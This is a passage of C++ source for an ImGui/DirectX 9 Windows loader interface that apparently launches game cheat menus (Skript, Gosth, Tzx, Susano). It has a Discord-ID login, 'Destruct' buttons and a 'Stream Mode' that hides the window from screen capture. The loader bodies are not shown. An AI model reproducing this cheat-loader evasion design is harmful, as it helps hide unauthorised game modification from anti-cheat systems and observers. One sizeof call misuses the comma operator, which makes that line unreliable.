							ImVec2 imageMax = ImVec2(imageMin.x + imageSize.x, imageMin.y + imageSize.y);

							ImGui::SetCursorPos(ImVec2(140, 30));
							// Renderize a imagem.
							ImGui::Image((void*)g_Textures[selectedImageIndices[selectedGameIndex]], imageSize);
						}
						else {
							// Trate o caso em que o índice selecionado está fora do intervalo.
						}


						uint32_t u32_color = ImColor(154, 84, 84);

						draw_circles_and_lines(u32_color, ImGui::GetWindowPos());

						static auto G = Globals::Get();
						static ImVec4 active = ImGuiPP::ToVec4(153, 0, 255, 128);
						static ImVec4 inactive = ImGuiPP::ToVec4(255, 255, 255, 255);



						ImGui::SetCursorPos(ImVec2(100, 155));
						ImGui::InputTextWithHint("##username", "Discord ID", globals.user_name, sizeof(globals.user_name, globals.pass_word));

						ImGui::SetCursorPos(ImVec2(100, 193)); 

						if (ImGui::Button("Login")) 
						{
							idk::Tab = 1;
						}
					}
				}
				ImGui::End();
			}
			

			if (idk::Tab == 1)
			{
				ImGui::Begin("   ", &loader_active, window_flags);
				{
					uint32_t u32_color = ImColor(154, 84, 84);

					draw_circles_and_lines(u32_color, ImGui::GetWindowPos());

					ImGui::SetCursorPos(ImVec2(80, 40));
					if (m3np::tab2("Skript", idk::Tab == 1)) idk::Tab = 1;
					ImGui::SameLine();
					if (m3np::tab2("Gosth", idk::Tab == 2)) idk::Tab = 2;
					ImGui::SameLine();
					if (m3np::tab2("Tzx", idk::Tab == 3)) idk::Tab = 3;
					ImGui::SameLine();
					if (m3np::tab2("Susano", idk::Tab == 4)) idk::Tab = 4;
					ImGui::SameLine();
					if (m3np::tab2("Info", idk::Tab == 5)) idk::Tab = 5;

					ImGui::SetCursorPos(ImVec2(80, 120));
					if (ImGui::Button("Load Skript"))
					{
						std::thread loading(loadskript);
						loading.detach();
					}

					ImGui::SetCursorPos(ImVec2(170, 230));


					ImGui::SetCursorPos(ImVec2(80, 160));
					if (ImGui::Button("  Destruct  "))  
					{
						std::thread destruct1(destruct);
						destruct1.detach();
					}

					ImGui::SetCursorPos(ImVec2(170, 230));

					static bool checking = true;

					if (checking)
					{
						HWND hwnd = GetActiveWindow();
						SetWindowDisplayAffinity(hwnd, 0x00000011);
					}

					else
					{
						HWND hwnd = GetActiveWindow();
						SetWindowDisplayAffinity(hwnd, 0x00000000);
					}
					ImGui::SetCursorPos(ImVec2(80, 210));
					ImGui::Checkbox("Stream Mode", &checking);

				}

			}
		}

		if (idk::Tab == 2)
		{
			ImGui::Begin("   ", &loader_active, window_flags);
			{
				uint32_t u32_color = ImColor(154, 54, 54);

				draw_circles_and_lines(u32_color, ImGui::GetWindowPos());

				ImGui::SetCursorPos(ImVec2(80, 40));
				if (m3np::tab2("Skript", idk::Tab == 1)) idk::Tab = 1;
				ImGui::SameLine();
				if (m3np::tab2("Gosth", idk::Tab == 2)) idk::Tab = 2;
				ImGui::SameLine();
				if (m3np::tab2("Tzx", idk::Tab == 3)) idk::Tab = 3;
				ImGui::SameLine();
				if (m3np::tab2("Susano", idk::Tab == 4)) idk::Tab = 4;
				ImGui::SameLine();
				if (m3np::tab2("Info", idk::Tab == 5)) idk::Tab = 5;

				ImGui::SetCursorPos(ImVec2(80, 120));
				if (ImGui::Button("Load Gosth"))
				{
					std::thread loading(loadgosth);
					loading.detach();
				}

				ImGui::SetCursorPos(ImVec2(160, 230));




				ImGui::SetCursorPos(ImVec2(80, 160));
				if (ImGui::Button("  Destruct  "))
				{
					std::thread destruct1(destruct);
					destruct1.detach();
				}

				ImGui::SetCursorPos(ImVec2(160, 230));

				static bool checking = false;

				if (checking)
				{
					HWND hwnd = GetActiveWindow();


					SetWindowDisplayAffinity(hwnd, 0x00000011);
				}

				else
				{
					HWND hwnd = GetActiveWindow();
					SetWindowDisplayAffinity(hwnd, 0x00000000);
				}
				ImGui::SetCursorPos(ImVec2(80, 210));
				ImGui::Checkbox("Stream Mode", &checking);
			}
		}

		if (idk::Tab == 3)
		{
			ImGui::Begin("   ", &loader_active, window_flags);
			{
				uint32_t u32_color = ImColor(154, 54, 54);

				draw_circles_and_lines(u32_color, ImGui::GetWindowPos());

				ImGui::SetCursorPos(ImVec2(80, 40));
				if (m3np::tab2("Skript", idk::Tab == 1)) idk::Tab = 1;
				ImGui::SameLine();
				if (m3np::tab2("Gosth", idk::Tab == 2)) idk::Tab = 2;
				ImGui::SameLine();
				if (m3np::tab2("Tzx", idk::Tab == 3)) idk::Tab = 3;
				ImGui::SameLine();
				if (m3np::tab2("Susano", idk::Tab == 4)) idk::Tab = 4;
				ImGui::SameLine();
				if (m3np::tab2("Info", idk::Tab == 5)) idk::Tab = 5;

				ImGui::SetCursorPos(ImVec2(80, 120));
				if (ImGui::Button("  Load Tzx  "))
				{
					std::thread loading(loadtzx);
					loading.detach();
				}


				ImGui::SetCursorPos(ImVec2(80, 160));
				if (ImGui::Button("  Destruct  "))
				{
					std::thread destruct1(destruct);
					destruct1.detach();
				}


				ImGui::SetCursorPos(ImVec2(160, 230));


				static bool checking = false;

				if (checking)
				{
					HWND hwnd = GetActiveWindow();


					SetWindowDisplayAffinity(hwnd, 0x00000011);
				}

				else
				{
					HWND hwnd = GetActiveWindow();
					SetWindowDisplayAffinity(hwnd, 0x00000000);
				}
				ImGui::SetCursorPos(ImVec2(80, 210));
				ImGui::Checkbox("Stream Mode", &checking);

				

			}

		}

		if (idk::Tab == 4)
		{
			ImGui::Begin("   ", &loader_active, window_flags);
			{
				uint32_t u32_color = ImColor(154, 54, 54);

				draw_circles_and_lines(u32_color, ImGui::GetWindowPos());

				ImGui::SetCursorPos(ImVec2(80, 40));
				if (m3np::tab2("Skript", idk::Tab == 1)) idk::Tab = 1;
				ImGui::SameLine();
				if (m3np::tab2("Gosth", idk::Tab == 2)) idk::Tab = 2;
				ImGui::SameLine();
				if (m3np::tab2("Tzx", idk::Tab == 3)) idk::Tab = 3;
				ImGui::SameLine();
				if (m3np::tab2("Susano", idk::Tab == 4)) idk::Tab = 4;
				ImGui::SameLine();
				if (m3np::tab2("Info", idk::Tab == 5)) idk::Tab = 5;

				ImGui::SetCursorPos(ImVec2(80, 120));
				if (ImGui::Button("Load susano"))
				{
					std::thread loading(loadsusano);
					loading.detach();
				}

				ImGui::SetCursorPos(ImVec2(170, 230));


				ImGui::SetCursorPos(ImVec2(80, 160));
				if (ImGui::Button("Destruct.gg"))
				{
					std::thread destruct1(destruct);
					destruct1.detach();
				}


				ImGui::SetCursorPos(ImVec2(160, 230));


				static bool checking = false;

				if (checking)
				{
					HWND hwnd = GetActiveWindow();


					SetWindowDisplayAffinity(hwnd, 0x00000011);
				}

				else
				{
					HWND hwnd = GetActiveWindow();
					SetWindowDisplayAffinity(hwnd, 0x00000000);
				}
				ImGui::SetCursorPos(ImVec2(80, 210));
				ImGui::Checkbox("Stream Mode", &checking);



			}

		}






				
		if (idk::Tab == 5)
		{
			ImGui::Begin("   ", &loader_active, window_flags);
			{
				uint32_t u32_color = ImColor(154, 54, 54);
				
				draw_circles_and_lines(u32_color, ImGui::GetWindowPos());

				ImGui::SetCursorPos(ImVec2(80, 40));
				if (m3np::tab2("Skript", idk::Tab == 1)) idk::Tab = 1;
				ImGui::SameLine();
				if (m3np::tab2("Gosth", idk::Tab == 2)) idk::Tab = 2;
				ImGui::SameLine();
				if (m3np::tab2("Tzx", idk::Tab == 3)) idk::Tab = 3;
				ImGui::SameLine();
				if (m3np::tab2("Susano", idk::Tab == 4)) idk::Tab = 4;
				ImGui::SameLine();
				if (m3np::tab2("Info", idk::Tab == 5)) idk::Tab = 5;


				ImGui::SetCursorPos(ImVec2(160, 230));


				static bool checking = false;

				if (checking)
				{
					HWND hwnd = GetActiveWindow();


					SetWindowDisplayAffinity(hwnd, 0x00000011);
				}

				else
				{
					HWND hwnd = GetActiveWindow();
					SetWindowDisplayAffinity(hwnd, 0x00000000);
				}
				ImGui::SetCursorPos(ImVec2(80, 210));
				ImGui::Checkbox("Stream Mode", &checking);


				ImGui::SetCursorPos(ImVec2(80, 80)); 
				ImGui::BulletText("Instructions");
				ImGui::SetCursorPos(ImVec2(90, 100)); 

				ImGui::Text("Read Carefully");
				

				
					  
				

			}

		}
			






		ImGui::EndFrame();

		g_pd3dDevice->Clear(0, NULL, D3DCLEAR_TARGET | D3DCLEAR_ZBUFFER, 0, 1.0f, 0);
		if (g_pd3dDevice->BeginScene() >= 0)
		{
			ImGui::Render();
			ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
			g_pd3dDevice->EndScene();
		}
		if (io.ConfigFlags & ImGuiConfigFlags_ViewportsEnable)
		{
			ImGui::UpdatePlatformWindows();
			ImGui::RenderPlatformWindowsDefault();
		}
		HRESULT result = g_pd3dDevice->Present(NULL, NULL, NULL, NULL);
		if (result == D3DERR_DEVICELOST && g_pd3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET) {
			ResetDevice();
		}

		if (!loader_active)
		{
			msg.message = WM_QUIT;
		}
	}

	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();
	CleanupDeviceD3D();
	//DestroyWindow(main_hwnd);
	UnregisterClass(wc.lpszClassName, wc.hInstance);
	//return 0;
}


LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
		return true;

	switch (msg)
	{
	case WM_SIZE:
		if (g_pd3dDevice != NULL && wParam != SIZE_MINIMIZED)
		{
			g_d3dpp.BackBufferWidth = LOWORD(lParam);
			g_d3dpp.BackBufferHeight = HIWORD(lParam);
			ResetDevice();
		}
		return 0;
	case WM_SYSCOMMAND:
		if ((wParam & 0xfff0) == SC_KEYMENU) // Disable ALT application menu
			return 0;
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}
	return DefWindowProc(hWnd, msg, wParam, lParam);


}

int __stdcall wWinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow )
{
	LoopFunction( nullptr );

	return EXIT_SUCCESS;
}